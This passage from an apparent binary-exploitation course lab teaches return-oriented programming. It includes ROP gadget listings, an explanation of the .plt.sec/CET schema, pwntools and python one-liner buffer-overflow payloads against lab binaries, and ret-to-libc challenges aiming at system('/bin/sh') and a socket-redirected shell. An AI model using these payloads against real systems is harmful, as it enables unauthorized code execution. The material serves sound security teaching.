Unique gadgets found: 121

pwndbg&gt; rop --grep &#34;pop .* ; pop .* ; ret&#34;  # you can perform a finer search using the --grep parameter and regular expressions
0x0804923d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923c : jecxz 0x80491c1 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923b : jne 0x8049220 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x08049240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049242 : pop edi ; pop ebp ; ret
0x08049241 : pop esi ; pop edi ; pop ebp ; ret
</code></pre><h2 id=further-reading>Further Reading</h2><h3 id=rop-gadgets-in-pwntools>ROP Gadgets in <code>pwntools</code></h3><p><code>pwntools</code> has a rather advanced
<a href=https://docs.pwntools.com/en/stable/rop/rop.html>ROP module</a> that is capable
of crafting ROP attacks corresponding to various functions by creating
concatenating chains of ROP adresses, also known as ROP chains.</p><p>For this session, you won&rsquo;t need to use this module, but it may come in handy in
the future.</p><h3 id=linux-x86-program-start-up>Linux x86 Program Start Up</h3><p>Notice that the <code>__libc_start_main</code> will always be present in the relocation
table. As you discovered in the session dedicated to
<a href=https://github.com/hexcellents/sss-binary/tree/master/sessions/executable-file-formats>executable file formats</a>,
this is the function called by the code from the <code>_start</code> label, which, in turn,
calls the <code>main()</code> function.</p><p>To find more details about the startup of a Linux x86 program, you can read
about it
<a href=http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html>here</a>.</p><h3 id=the-pltsec-schema>The <code>.plt.sec</code> Schema</h3><p>Let&rsquo;s go back to the small piece of code at the beginning of this lecture:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#000>puts</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Hello world!&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>If we compile it with a more modern (later than 2019) version of even the most
&ldquo;old-school&rdquo; compilers, such as <code>gcc</code>, we will notice a slight (but actually
important) difference in the <code>.plt</code> schema used by the resulting binary file.</p><pre tabindex=0><code>$ gcc -m32 -fno-PIC -no-pie hello.c -o hello
$ objdump -M intel -d hello
[...]
Disassembly of section .plt:

08049030 &lt;.plt&gt;:
 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
 804903c:       0f 1f 40 00             nop    DWORD PTR [eax+0x0]
 8049040:       f3 0f 1e fb             endbr32 
 8049044:       68 00 00 00 00          push   0x0
 8049049:       e9 e2 ff ff ff          jmp    8049030 &lt;.plt&gt;
 804904e:       66 90                   xchg   ax,ax
 8049050:       f3 0f 1e fb             endbr32 
 8049054:       68 08 00 00 00          push   0x8
 8049059:       e9 d2 ff ff ff          jmp    8049030 &lt;.plt&gt;
 804905e:       66 90                   xchg   ax,ax

Disassembly of section .plt.sec:

08049060 &lt;puts@plt&gt;:
 8049060:       f3 0f 1e fb             endbr32 
 8049064:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
 804906a:       66 0f 1f 44 00 00       nop    WORD PTR [eax+eax*1+0x0]
[...]
</code></pre><p>Now it seems there are two <code>.plt</code> sections: the &ldquo;classic&rdquo; <code>.plt</code> and a new
<code>.plt.sec</code> section. Moreover, the entries in the <code>.plt.sec</code> section are very
similar to those we&rsquo;ve previously shown as being part of <code>.plt</code>. So why 2
<code>.plt</code>&rsquo;s? And if the initial <code>.plt</code> entries have been moved over to <code>.plt.sec</code>,
what is the purpose of the <code>.plt</code> section now?</p><p>First, let&rsquo;s check the call to <code>puts()</code> itself:</p><pre tabindex=0><code>$ objdump -D -j .text -M intel hello | grep puts
 80491b3:	e8 a8 fe ff ff       	call   8049060 &lt;puts@plt&gt;
</code></pre><p>So we see that the function being called now resides in the <code>.plt.sec</code> section.
What about the offset that <code>.plt.sec</code> redirect jumps to (i.e. <code>0x804c00c</code>)?</p><pre tabindex=0><code>$ objdump -s -M intel -j .got.plt --start-address=0x0804c00c hello

hello:     file format elf32-i386

Contents of section .got.plt:
 804c00c 40900408 50900408                    @...P...
</code></pre><p>Similarly to what we did previously, we now see that <code>0x804c00c</code> points to
address <code>0x08049040</code>, which is this code inside the <code>.plt</code> section:</p><pre tabindex=0><code>8049040:       f3 0f 1e fb             endbr32 
8049044:       68 00 00 00 00          push   0x0
8049049:       e9 e2 ff ff ff          jmp    8049030 &lt;.plt&gt;
804904e:       66 90                   xchg   ax,ax
</code></pre><p>So with the <code>.plt.sec</code> schema, there are 2 redirects: one from <code>.plt.sec</code> to
<code>.got</code> (or <code>.got.plt</code> to be more precise) and another from <code>.got.plt</code> to <code>.plt</code>.
Notice in the <code>.plt</code> stub above that, like before, <code>0x0</code> is pushed onto the
stack before the resolver is called, so that the dynamic linker can change it to
the actual address of <code>puts()</code> from libc.</p><p>So why use <code>.plt.sec</code> at all if in the end it looks like it does the same thing?
Well, <code>.plt.sec</code> is an x86-only security enhancement of the <code>.plt</code> section
(hence the <code>.sec</code> part of the name, duh&mldr;), that is used only when a security
enhancement feature called <strong>CET (Control-flow Enforcement Technology)</strong> is
enabled. In this comment, I&rsquo;ll explain what the feature is and why we have two
PLT sections if CET is enabled.</p><p>So, what does CET do? CET introduces a new restriction to indirect jump
instructions. In order to understand how CET works, let&rsquo;s assume that it is
enabled. Then, if you execute an indirect jump instruction, the processor
verifies that a special &ldquo;landing pad&rdquo; instruction, which is actually a
repurposed <code>NOP</code> instruction (now called <code>endbr32</code> or <code>endbr64</code>, as you can see
in the above snippets), is at the jump target. If the jump target does not start
with that instruction, the processor raises an exception instead of continuing
to execute code.</p><p>If CET is enabled, the compiler places <code>endbr</code> instructions to all locations
where indirect jumps may lead. This mechanism makes it extremely hard to
transfer the control to a middle of a function that is not supporsed to be a
indirect jump target, preventing certain types of attacks, such as ROP or JOP
(jump-oriented programming; very similar to ROP).</p><p>Now, let&rsquo;s explain why we have this extra PLT section for when CET is enabled.
Since you can indirectly jump to a PLT entry, we have to make PLT entries start
with an <code>endbr</code> instruction. The problem is there was no extra space for <code>endbr</code>
(which is 4 bytes long) in the old <code>.plt</code> entry schema, as the PLT entry is only
16 bytes long and all of them are already used.</p><p>In order to deal with the issue, each PLT entry was splt into two separate
entries. Remember that each PLT entry contains code to jump to an address read
from <code>.got.plt</code> <strong>AND</strong> code to resolve a dynamic symbol lazily. With the 2-PLT
schema, the former code is written to <code>.plt.sec</code>, and the latter code is written
to <code>.plt</code>, as demonstrated above.</p><h4 id=more-about-cet-and-endbr>More about CET and <code>endbr</code></h4><ul><li>A more in-depth look at the inner workings of CET and the concept of the
<strong>Shadow Stack</strong> that it uses, can be found
<a href=https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html>here</a>
and
<a href=https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html>here</a></li><li>The way <code>endbr</code> instructions interact with the CPU is explained
<a href=https://cdrdv2.intel.com/v1/dl/getContent/631121>here</a>, at page 38</li></ul><h4 id=tldr>TLDR</h4><p>Lazy symbol resolution in the 2-PLT schema works in the usual way, except
that the regular <code>.plt</code> is now called <code>.plt.sec</code> and <code>.plt</code> is repurposed to
contain only code for lazy symbol resolution.</p><h2 id=putting-it-all-together-demo>Putting it all Together: Demo</h2><p>Now that we&rsquo;ve learned the theoretical aspects of what Return Oriented
Programming is, let&rsquo;s put everything in practice as part of a demo.</p><p>Navigate to the folder <a href=activities/00-demo>00-demo</a>. Notice that it contains
two executables, one compiled for 32 bits (<code>vuln</code>) and the other for 64 bits
(<code>vuln64</code>). TODO: diff</p><p>Looking at their source code (it&rsquo;s one and the same for both of them), we can
easily identify their vulnerability: the <code>reader</code> function reads (duh&mldr;) 128
bytes from <code>stdin</code> into a buffer whose capacity is only 64 bytes. So we&rsquo;ll be
able to overflow this buffer. We aim to do this in order to showcase the concept
of <strong>code reuse</strong>.</p><h3 id=calling-a-function>Calling a Function</h3><p>The most basic type of code reuse is calling a function. For this, we&rsquo;ll be
calling the <code>warcraft</code> function in the <code>vuln</code> and <code>vuln64</code> binaries mentioned
above. In order to do this, we&rsquo;ll need to know:</p><ol><li>the offset of the return address inside our buffer</li><li>the address of the <code>warcraft</code> function inside the binary.</li></ol><p>For all our exploits we&rsquo;ll be using the <code>exploit.py</code> script, which is also
available in the <a href=activities/00-demo>00-demo</a> folder. Notice that <code>pwntools</code>
provides a functionality similar to <code>nm</code>, by which we can obtain the addresses
of various sybols in the binary (as long as it hasn&rsquo;t been stripped):</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>e</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>ELF</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>filename</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>warcraft_address</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>e</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;warcraft&#34;</span><span style=color:#000;font-weight:700>]</span>
</span></span></code></pre></div><p>As of now, requirement #2 mentioned above is complete. In order to also complete
the first requirement, we&rsquo;ll use <code>objdump</code> and check the <code>reader</code> function:</p><pre tabindex=0><code>$ objdump -M intel -d vuln
08048529 &lt;reader&gt;:
 8048529:       55                      push   ebp
 804852a:       89 e5                   mov    ebp,esp
 804852c:       83 ec 40                sub    esp,0x40
 [...]
 804853c:       a1 40 a0 04 08          mov    eax,ds:0x804a040
 8048541:       50                      push   eax
 8048542:       68 80 00 00 00          push   0x80
 8048547:       8d 45 c0                lea    eax,[ebp-0x40]
 804854a:       50                      push   eax
 804854b:       e8 10 fe ff ff          call   8048360 &lt;fgets@plt&gt;
</code></pre><p>Our vulnerable buffer is the first parameter of <code>fgets</code>, which is at offset
<code>ebp - 0x40</code> i.e. <code>ebp - 64</code>. Which means that the offset of the return address
is <code>64 + 4 = 68</code> bytes into this buffer (remember how a stack frame looks like).</p><p>So, in order to call the <code>warcraft</code> function, we&rsquo;ll give our binary a payload
made up of a padding of 68 bytes, followed by the address of <code>warcraft</code>, written
in <em>little endian</em> representation, which can be written like this:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>0x40</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#0000cf;font-weight:700>4</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;A&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>warcraft_address</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><p>Now our exploit is done. In order to perform this exploit on <code>vuln64</code>, simply
run <code>objdump</code> on this binary and remember that the length of a pointer on a
64-bit architecture is 8 bytes, which means that the offset of the return
address is going to be <code>rbp + 8</code>.</p><p>One thing to keep in mind is that you are by no means required to use addresses
that point to the beginning of functions in your payloads. You can use any valid
address from the <code>.text</code> section and the exploit should work just fine in
executing code from the address you provide it.</p><p>Now on to our next scenario: what if the function we&rsquo;re calling requires a
parameter?</p><h3 id=calling-a-function-with-parameters>Calling a Function with Parameters</h3><p>Let&rsquo;s first look at the stack of a function when it&rsquo;s called &ldquo;normally&rdquo;, i.e.
with a <code>call</code> instruction. Let&rsquo;s use the <code>overwatch</code> function in <code>vuln.c</code> as an
example. The picture below shows where its parameter is placed.</p><p><img src=assets/overwatch_stack_simple.png alt="Overwatch Stack"></p><p>Furthermore, as expected, the function retrieves its parameter from address
<code>ebp + 8</code>, as shown above. How can we craft a payload so that, upon entering the
function, the required <code>0xdeadbeef</code> parameter is where the function expects it
to be?</p><p>We&rsquo;ll obviously need to place <code>0xdeadbeef</code> on the stack (in little endian
representation, of course), but where? After the function&rsquo;s preamble
(<code>push ebp; mov esp, ebp</code>), <code>ebp</code> points to the location where the previous
stack pointer it saved. Above it, the function expects to find its return
address. Thus, we need to write 4 padding bytes in its place. The next 4 bytes
are the first parameter. Just for reference, the next 4 bytes (<code>ebp + 12</code>) are
the second parameter and so on. So, in order to call <code>overwatch</code> with the
<code>0xdeadbeef</code> parameter, the payload would look like this:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;A&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>overwatch_address</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#0000cf;font-weight:700>4</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;B&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xdeadbeef</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><p>Take a look at those 4 <code>B</code>&rsquo;s in the payload above. We agreed that they are
<code>overwatch</code>&rsquo;s expected return address. So if we wanted to call another function,
we would only need to replace them with that function&rsquo;s address. Pretty simple,
right? But what if we wanted to call a third function? Well, then we would need
to overwrite the next 4 bytes in our payload with a third address. Easy! But now
we have actually run into trouble: the next 4 bytes are <code>overwatch</code>&rsquo;s parameter.
In this situation it looks like we <strong>either</strong> call <code>overwatch</code> or we call a third
function. Not cool. In this case, <code>overwatch</code>s stack would look like this:</p><p><img src=assets/overwatch_stack_conflict.png alt="Overwatch Stack with Conflicting Parameter/Address"></p><p>It seems we need another mechanism so that we can call <strong>all 3 functions</strong> with
all their correct parameters. Enter ROPs!</p><h3 id=calling-multiple-functions>Calling Multiple Functions</h3><p>What we need in order to solve the dilemma presented above is a means by which
to <strong>remove</strong> <code>overwatch</code>&rsquo;s parameter (i.e. <code>0xdeadbeef</code>) from the stack once
the function is finished. We know that the <code>pop</code> instruction is good for
removing stuff from the stack. So what we need is to execute the following two
instructions:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>pop &lt;any_register&gt;
ret
</code></pre><p>Since <code>ret</code> is equivalent to <code>pop eip</code>, the above code removes <code>0xdeadbeef</code> from
the stack and places the instruction pointer (<code>eip</code>) at the address lying on the
stack above <code>0xdeadbeef</code>. One thing to keep in mind is that now we&rsquo;re only
interested in clearing the stack, so <code>pop</code> can be used with any 32 bit register.</p><p>As a result, <code>overwatch</code>&rsquo;s stack should look like the one in the image below.
Notice there are no more conflicts now. Hurray!</p><p><img src=assets/overwatch_stack_no_conflict.png alt="Overwatch Stack without Conflicting Parameters and Addresses"></p><h4 id=finding-gadgets---ropgadget>Finding Gadgets - <code>ROPgadget</code></h4><p>The <code>pop; ret</code> instructions above are called a <strong>gadget</strong>, i.e. a small group of
<strong>consecutive</strong> instructions that ends in <code>ret</code> and which can be used to alter
the execution of a given program. Since all binaries contain a <code>.text</code> section,
which is made up of instructions, all binaries contain gadgets. Lots of them.</p><p>The tool that we&rsquo;re going to use in order to find such gadgets is called
<code>ROPgadget</code>. It is already installed in the Kali VM and if you&rsquo;re working on
another environment, you can install it by following the instructions in the
tool&rsquo;s <a href=https://github.com/JonathanSalwan/ROPgadget>Github repo</a>.</p><p>In order to run <code>ROPgadget</code> from your terminal, you need to specify a binary
file to it using the <code>--binary</code> parameter. It is also recommended (if you know
what gadgets you&rsquo;re looking for) to filter those you need using the <code>--only</code>
parameter. As a result, in order to obtain a <code>pop; ret</code> gadget, we need to run
the following command:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ROPgadget --binary vuln --only <span style=color:#4e9a06>&#34;pop|ret&#34;</span>
</span></span><span style=display:flex><span>Gadgets <span style=color:#000>information</span>
</span></span><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>============================================================</span>
</span></span><span style=display:flex><span>0x080485eb : pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x080485e8 : pop ebx <span style=color:#000;font-weight:700>;</span> pop esi <span style=color:#000;font-weight:700>;</span> pop edi <span style=color:#000;font-weight:700>;</span> pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x08048331 : pop ebx <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x080485ea : pop edi <span style=color:#000;font-weight:700>;</span> pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x080485e9 : pop esi <span style=color:#000;font-weight:700>;</span> pop edi <span style=color:#000;font-weight:700>;</span> pop ebp <span style=color:#000;font-weight:700>;</span> ret
</span></span><span style=display:flex><span>0x0804831a : ret
</span></span><span style=display:flex><span>0x0804819c : ret 0x3e41
</span></span><span style=display:flex><span>0x0804844e : ret 0xeac1
</span></span></code></pre></div><p>Thus, the payload needed in order to call both <code>overwatch</code> and <code>warcraft</code> is the
one showcased below, with <code>pop_ret_gadget_address</code> being set to <code>0x08048331</code>
from the output above.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;A&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>overwatch_address</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>pop_ret_gadget_address</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>	<span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xdeadbeef</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>warcraft_address</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><p>Notice this yet is another example of <strong>code reuse</strong> since we&rsquo;re reusing various
chunks of instructions already present in our binary.</p><h2 id=challenges>Challenges</h2><h3 id=01-tutorial---bypass-nx-stack-with-return-to-libc>01. Tutorial - Bypass NX Stack with return-to-libc</h3><p>Go to the <a href=activities/01-tutorial-ret-to-libc/src/>01-tutorial-ret-to-libc/</a>
folder.</p><p>In the previous sessions we used stack overflow vulnerabilities to inject new
code into a running process (on its stack) and redirect execution to it. This
attack is easily defeated by making the stack, together with any other memory
page that can be modified, non-executable. This is achieved by setting the
<strong>NX</strong> bit in the page table of the current process.</p><p>We will try to bypass this protection for the <code>01-tutorial-ret-to-libc/src/auth</code>
binary in the lab archive. For now, disable ASLR in the a new shell:</p><pre tabindex=0><code>$ setarch $(uname -m) -R /bin/bash
</code></pre><p>Let&rsquo;s take a look at the program headers and confirm that the stack is no longer
executable. We only have read and write (RW) permissions for the stack area.
The auth binary requires the <code>libssl1.0.0:i386</code> Debian package to work. You can
find <code>libssl1.0.0:i386</code> Debian package
<a href=https://packages.debian.org/jessie/i386/libssl1.0.0/download>here</a>.</p><p>First, let&rsquo;s check that <em>NX</em> bit we mentioned earlier:</p><pre tabindex=0><code>$ checksec auth
    [...]
    NX:       NX enabled
    [...]
</code></pre><p>For completeness, lets check that there is indeed a buffer (stack) overflow vulnerability.</p><pre tabindex=0><code>$ python2.7 -c &#39;print &#34;A&#34; * 1357&#39; | ltrace -i ./auth
TODO
</code></pre><p>Check the source file - the buffer length is 1337 bytes. There should be a base
pointer and the <code>main()</code>&rsquo;s return address just before it on the stack. There is
also some alignment involved, but we can easily try a few lengths to get the
right position of the return address. Seems to be 1337 + 16 followed by the
return address for this case. You can, of course, determine the distance between
the buffer&rsquo;s start address and the frame&rsquo;s return address exactly using objdump,
but we will leave that as an exercise.</p><p>We can now jump anywhere. Unfortunately, we cannot put a shellcode in the buffer
and jump into it because the stack is non-executable now. Lets try it with a few
<code>NOP</code>s. Our buffer&rsquo;s address is <code>0xbfffee63</code> (see the <code>gets()</code> call).</p><pre tabindex=0><code>$ python2.7 -c &#39;print &#34;\x90\x90\x90\x90&#34; + &#34;A&#34; * 1349 + &#34;\x63\xee\xff\xbf&#34;&#39; | ltrace -i ./auth
[0x80484f1] __libc_start_main(0x80486af, 1, 0xbffff454, 0x80486c0, 0x8048730 &lt;unfinished ...&gt;
[0x8048601] malloc(20)                                                                            = 0x0804b008
[0x80485df] puts(&#34;Enter password: &#34;Enter password: 
)                                                              = 17
[0x80485ea] gets(0xbfffee63, 0x8048601, 0x80486af, 0xb7cdecb0, 0xb7cdecb7)                        = 0xbfffee63
[0x8048652] memset(0x0804b008, &#39;\000&#39;, 20)                                                        = 0x0804b008
[0x8048671] SHA1(0xbfffee63, 137, 0x804b008, 4, 0x90000001)                                       = 0x804b008
[0xbfffee63] --- SIGSEGV (Segmentation fault) ---
[0xffffffff] +++ killed by SIGSEGV +++
</code></pre><p>Guess what? It didn&rsquo;t work&mldr; How about we try to jump to some existing code?
First, let&rsquo;s take a look at the <code>check_password()</code> function.</p><pre tabindex=0><code>$ objdump -M intel -d auth | grep -A 15 &#34;&lt;check_password&gt;:&#34;
080485ec &lt;check_password&gt;:
 80485ec:	55                   	push   ebp
 80485ed:	89 e5                	mov    ebp,esp
 80485ef:	81 ec 58 05 00 00    	sub    esp,0x558
 80485f5:	c7 04 24 14 00 00 00 	mov    DWORD PTR [esp],0x14
 80485fc:	e8 9f fe ff ff       	call   80484a0 &lt;malloc@plt&gt;
 8048601:	a3 38 a0 04 08       	mov    ds:0x804a038,eax
 8048606:	a1 38 a0 04 08       	mov    eax,ds:0x804a038
 804860b:	85 c0                	test   eax,eax
 804860d:	75 18                	jne    8048627 &lt;check_password+0x3b&gt;
 804860f:	c7 04 24 76 87 04 08 	mov    DWORD PTR [esp],0x8048776
 8048616:	e8 95 fe ff ff       	call   80484b0 &lt;puts@plt&gt;
 804861b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048622:	e8 99 fe ff ff       	call   80484c0 &lt;exit@plt&gt;
 8048627:	8d 85 bb fa ff ff    	lea    eax,[ebp-0x545]
 804862d:	89 04 24             	mov    DWORD PTR [esp],eax
</code></pre><p>Lets try <code>0x804860f</code> such that we print the <code>malloc</code> failure message.</p><pre tabindex=0><code>$ python2.7 -c &#39;print &#34;A&#34; * 1353 + &#34;\x0f\x86\x04\x08&#34;&#39; | ltrace -i -e puts ./auth
[0x80485df] puts(&#34;Enter password: &#34;Enter password: 
)                                                              = 17
[0x804861b] puts(&#34;malloc failed&#34;malloc failed
)                                                                 = 14
[0xffffffff] +++ exited (status 1) +++
</code></pre><h3 id=02-challenge---ret-to-libc>02. Challenge - ret-to-libc</h3><p>So far, so good! Now let&rsquo;s get serious and do something useful with this.</p><p>Continue working in the <code>01-tutorial-ret-to-libc/</code> folder in the activities
archive.</p><p>The final goal of this task is to bypass the NX stack protection and call
<code>system("/bin/sh")</code>. We will start with a simple ret-to-plt:</p><ol><li>Display all libc functions linked with the auth binary.</li><li>Return to <code>puts()</code>. Use ltrace to show that the call is actually being made.</li><li>Find the offset of the <code>"malloc failed"</code> static string in the binary.</li><li>Make the binary print <code>"failed"</code> the second time <code>puts()</code> is called.</li><li><strong>(bonus)</strong> The process should SEGFAULT after printing <code>Enter password:</code>
again. Make it exit cleanly (the exit code does not matter, just no <code>SIGSEGV</code>).
You can move on to the next task without solving this problem.</li><li>Remember how we had ASLR disabled? The other libc functions are in the
memory, you just need to find their addresses. Find the offset of <code>system()</code> in
libc. Find the offset of the <code>"/bin/sh"</code> string in libc.</li><li>Where is libc linked in the auth binary? Compute the final addresses and call
<code>system("/bin/sh")</code> just like you did with <code>puts()</code>.</li></ol><details><summary>Hint 1</summary>
Use <code>LD_TRACE_LOADED_OBJECTS=1 ./auth</code> instead of <code>ldd</code>.
The latter is not always reliable, because the order in which it loads the
libraries might be different than when you actually run the binary.</details>
<details><summary>Hint 2</summary>
When you finally attack this, <code>stdin</code> will get closed and the new
shell will have nothing to read. Use <code>cat</code> to concatenate your attack
string with <code>stdin</code> like this:
<code>cat <(python -c 'print “L33T_ATTACK”') - | ./vulnbinary</code>.<p>Note the use of the <code>-</code> (dash) character before the <code>|</code>
(pipe). This prevents the closing of the input file descriptor of the pipe when
<code>cat</code>&rsquo;s output finished (i.e. when the <code>EOF</code> character is
received).</p></details><h3 id=03-challenge---no-ret-control>03. Challenge - no-ret-control</h3><p>Go to the
<a href=/activities/03-challenge-no-ret-control/src>03-challenge-no-ret-control/</a>
folder in the activities archive.</p><p>Imagine this scenario: we have an executable where we can change at least 4
bytes of random memory, but ASLR is turned on. We cannot reliably change the
value of the return address because of this. Sometimes <code>ret</code> is not even called
at the end of a function.</p><p>Alter the execution of <code>force_exit</code>, in order to call the secret function.</p><h3 id=04-challenge---ret-to-plt>04. Challenge - ret-to-plt</h3><p>Go to the <a href=/activities/04-ret-to-plt/src>04-challenge-ret-to-plt/</a> folder in
the activities archive.</p><p><code>random</code> is a small application that generates a random number.</p><p>Your task is to build an exploit that makes the application always print the
same second random number. That is the first printed random number is whatever,
but the second printed random number will always be the same, for all runs. In
the sample output below the second printed random number is always <code>1023098942</code>
for all runs.</p><pre tabindex=0><code>hari@solyaris-home:~$ python2.7 -c &#39;print &lt;payload here&gt;&#39; | ./random
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 2070249950. Have fun with it!
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 1023098942. Have fun with it!
Segmentation fault (core dumped)
hari@solyaris-home:~$ python2.7 -c &#39;print &lt;payload here&gt;&#39; | ./random
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 1152946153. Have fun with it!
Hi! Options:
	1. Get random number
	2. Go outside
Here&#39;s a random number: 1023098942. Have fun with it!
</code></pre><p>You can use the Python skeleton given in section <a href=#nop-analogy>NOP Analogy</a> for
the buffer overflow input.</p><p><strong>Bonus:</strong> The process should SEGFAULT after printing the second (constant)
number. Make it exit cleanly (the exit code does not matter, just no <code>SIGSEGV</code>).</p><h3 id=05-challenge---gadget-tutorial>05. Challenge - gadget tutorial</h3><p>This task requires you to construct a payload using gadgets and calling the
functions inside such that it will print</p><pre tabindex=0><code>Hello!
stage A!stage B!
</code></pre><p>Make it also print the messages in reverse order:</p><pre tabindex=0><code>Hello!
stage B!stage A!
</code></pre><h3 id=06-bonus-challenge---echo-service>06. Bonus Challenge - Echo service</h3><p>This task is a network service that can be exploited. Run it locally and try to
exploit it. You&rsquo;ll find that if you call <code>system("/bin/sh")</code> the shell is opened
in the terminal where the server was started instead of the one where the attack
takes place. This happens because the client-server communication takes place
over a socket. When you spawn a shell it will inherit the Standard I/O
descriptors from the parent and use those. To fix this you need to redirect the
socket fd into 0,1 (and optionally 2).</p><p>So you will need to do the equivalent of the following, as part of a ROP chain:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#000>dup2</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>sockfd</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>);</span>
